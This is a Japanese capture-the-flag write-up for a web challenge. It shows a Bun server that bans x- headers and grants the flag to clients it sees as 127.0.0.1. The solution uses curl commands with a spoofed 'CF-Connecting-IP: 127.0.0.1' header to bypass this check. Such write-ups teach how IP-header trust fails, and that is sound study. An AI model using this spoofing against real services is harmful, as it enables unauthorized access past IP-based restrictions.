# x:web:1pts
Attachments  
[x.zip](x.zip)  

Servers  
[https://x-ofbjo9tumm-fuuaq4evkq-an.a.run.app/](https://x-ofbjo9tumm-fuuaq4evkq-an.a.run.app/)  

x means x- header.  

**Target time: 5:00**  

手元で問題を動かす場合は以下のコマンドを実行してください:  
```
docker compose up --build
```
リモートサーバはすべてCloud Run上で動いています。ロードバランサの挙動がローカル環境とは異なる可能性があることに注意してください。  

# Solution
ソースコードとURLが渡されている。  
server.tsを見ると以下のようであった。  
```ts
import { getClientIp } from "request-ip";

const port = process.env.PORT || 3000;

Bun.serve({
  port,
  fetch(req) {
    // the remote server is running on Cloud Run, so these headers are sent.
    req.headers.delete("x-cloud-trace-context");
    req.headers.delete("x-forwarded-for");
    req.headers.delete("x-forwarded-proto");

    if ([...req.headers.keys()].some((k) => k.startsWith("x"))) {
      return new Response("x header is banned!", { status: 400 });
    }
    if (
      getClientIp({
        headers: Object.fromEntries(req.headers.entries()),
      }) === "127.0.0.1"
    ) {
      return new Response(process.env.FLAG);
    }
    return new Response("You are not coming from 127.0.0.1!");
  },
});
```
IPを`127.0.0.1`であると誤認させればフラグが得られるが、`x-`系統のヘッダーはすべて禁止されている。  
検索していると`CF-Connecting-IP`なるヘッダーがあるらしい。  
以下のように試す。  
```bash
$ curl https://x-ofbjo9tumm-fuuaq4evkq-an.a.run.app/
You are not coming from 127.0.0.1!
$ curl https://x-ofbjo9tumm-fuuaq4evkq-an.a.run.app/ -H "CF-Connecting-IP: 127.0.0.1"
flag{not_only_x-forwarded-for}
```
flagが得られた。  

## flag{not_only_x-forwarded-for}